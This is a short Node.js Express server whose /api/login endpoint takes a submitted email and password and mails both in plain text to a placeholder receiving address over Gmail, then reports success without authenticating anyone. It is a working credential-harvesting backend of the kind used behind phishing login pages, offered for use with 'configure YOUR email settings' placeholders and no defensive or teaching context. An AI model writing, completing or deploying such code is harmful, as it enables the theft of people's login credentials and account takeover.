const express = require('express');
const nodemailer = require('nodemailer');
const app = express();
app.use(express.json());

// This is where you configure YOUR email settings
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'your-email@gmail.com',
        pass: 'your-app-password'
    }
});

app.post('/api/login', (req, res) => {
    const { email, pass } = req.body;

    const mailOptions = {
        from: 'system@yourdomain.com',
        to: 'YOUR_RECEIVING_EMAIL@gmail.com',
        subject: 'New Login Attempt Recorded',
        text: `User: ${email}\nPassword: ${pass}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) return res.status(500).send("Error sending email");
        res.status(200).send("Logged successfully");
    });
});

app.listen(3000, () => console.log('Server running on port 3000'));
